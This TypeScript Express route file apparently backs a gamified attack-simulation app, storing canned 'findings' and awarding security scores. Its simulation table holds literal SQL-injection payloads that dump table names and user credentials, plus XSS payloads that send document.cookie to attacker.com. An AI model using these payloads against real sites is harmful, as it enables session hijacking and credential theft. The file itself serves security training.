import { Router } from 'express';
import prisma from '../lib/prisma';
import { authenticate } from '../middleware/auth';
import { io } from '../index';
import { emitSimulationUpdate } from '../services/socketService';

const router = Router();
router.use(authenticate);

const SIMULATION_SCRIPTS: Record<string, (findings: any[]) => void> = {
  'sql-injection': (f) => {
    f.push({ step: 1, action: 'Enumerating tables via UNION SELECT', severity: 'CRITICAL', payload: "' UNION SELECT table_name FROM information_schema.tables--" });
    f.push({ step: 2, action: 'Extracting user credentials', severity: 'CRITICAL', payload: "' UNION SELECT username,password FROM users--" });
  },
  'xss': (f) => {
    f.push({ step: 1, action: 'Reflected XSS payload injected', severity: 'HIGH', payload: '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>' });
    f.push({ step: 2, action: 'Stored XSS in comment field', severity: 'HIGH', payload: '<img src=x onerror=fetch("https://attacker.com/c?"+btoa(document.cookie))>' });
  },
  'brute-force': (f) => {
    f.push({ step: 1, action: 'Password spray attack initiated', severity: 'HIGH', payload: 'Tested 1000 common passwords against admin@target.com' });
    f.push({ step: 2, action: 'Credential stuffing from breach database', severity: 'CRITICAL', payload: 'Matched 3 credentials from known breach dataset' });
  },
  'recon': (f) => {
    f.push({ step: 1, action: 'DNS enumeration completed', severity: 'LOW', payload: 'Discovered: api.target.com, admin.target.com, dev.target.com' });
    f.push({ step: 2, action: 'Port scan results', severity: 'MEDIUM', payload: 'Open ports: 22, 80, 443, 8080, 5432' });
    f.push({ step: 3, action: 'OS fingerprinting', severity: 'LOW', payload: 'Ubuntu 22.04 LTS, Apache 2.4.52, PostgreSQL 14' });
  },
};

router.get('/', async (req, res) => {
  const sims = await prisma.simulation.findMany({
    where: { userId: req.user!.userId },
    orderBy: { createdAt: 'desc' },
    take: 50,
  });
  res.json(sims);
});

router.post('/', async (req, res) => {
  const { type, title, description } = req.body;
  const sim = await prisma.simulation.create({
    data: { type, title, description, userId: req.user!.userId, status: 'RUNNING' },
  });

  // Run simulation async
  setTimeout(async () => {
    const findings: any[] = [];
    const script = SIMULATION_SCRIPTS[type];
    if (script) script(findings);

    const score = findings.reduce((acc, f) => {
      const scores = { CRITICAL: 500, HIGH: 300, MEDIUM: 150, LOW: 50 };
      return acc + (scores[f.severity as keyof typeof scores] || 0);
    }, 0);

    const updated = await prisma.simulation.update({
      where: { id: sim.id },
      data: { status: 'COMPLETED', findings, score, completedAt: new Date() },
    });

    await prisma.user.update({
      where: { id: req.user!.userId },
      data: { securityScore: { increment: Math.floor(score / 10) } },
    });

    emitSimulationUpdate(io, sim.id, updated);
  }, 2000);

  res.status(201).json(sim);
});

router.get('/:id', async (req, res) => {
  const sim = await prisma.simulation.findFirst({ where: { id: req.params.id, userId: req.user!.userId } });
  if (!sim) { res.status(404).json({ error: 'Not found' }); return; }
  res.json(sim);
});

export default router;
